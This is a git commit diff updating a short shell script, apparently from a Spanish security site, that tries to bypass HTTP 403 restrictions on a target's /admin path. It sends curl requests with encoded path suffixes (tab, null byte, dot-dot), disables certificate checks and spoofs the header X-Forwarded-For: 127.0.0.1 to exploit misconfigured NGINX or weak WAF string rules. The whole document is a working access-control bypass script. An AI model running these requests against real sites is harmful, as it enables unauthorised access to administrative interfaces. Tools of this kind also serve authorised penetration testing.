48219177d851401e1020affc8df40078d06f24f8
hackingyseguridad <antonio_taboada@hotmail.es>
2026-02-13 19:19:36 +0100

    Update 403bypass1.sh

--- 403bypass1.sh
+++ 403bypass1.sh
@@ -1,19 +1,20 @@
-# bypass 403 hackingyseguridad.com 2026 
+#!/bin/sh
+# bypass 403 hackingyseguridad.com 2026
 # Configuraciones mal hechas en NGINX + backend legacy
 # Filtros WAF obsoletos
 # Reglas basadas solo en coincidencia de strings
 # @antonio_taboada
-# Usp: 
+# Usp:
 # sh 403bypass1.sh  https://pagina.com/admin
 
-curl -vvv -k -s -I --path-as-is -X GET '$1/admin;%09' \
+curl -k -s -I -L --path-as-is -X GET "$1/admin;%09" \
   -H 'User-Agent: Mozilla/5.0' \
   -H 'X-Forwarded-For: 127.0.0.1'
 
-curl -vvv -k -s -I --path-as-is -X GET '$1/admin;%09..' \
+curl -k -s -I -L --path-as-is -X GET "$1/admin;%09.." \
   -H 'User-Agent: Mozilla/5.0' \
   -H 'X-Forwarded-For: 127.0.0.1'
 
-curl -vvv -k -s -I --path-as-is -X GET '$1/admin;%00' \
+curl -k -s -I -L --path-as-is -X GET "$1/admin;%00" \
   -H 'User-Agent: Mozilla/5.0' \
   -H 'X-Forwarded-For: 127.0.0.1'
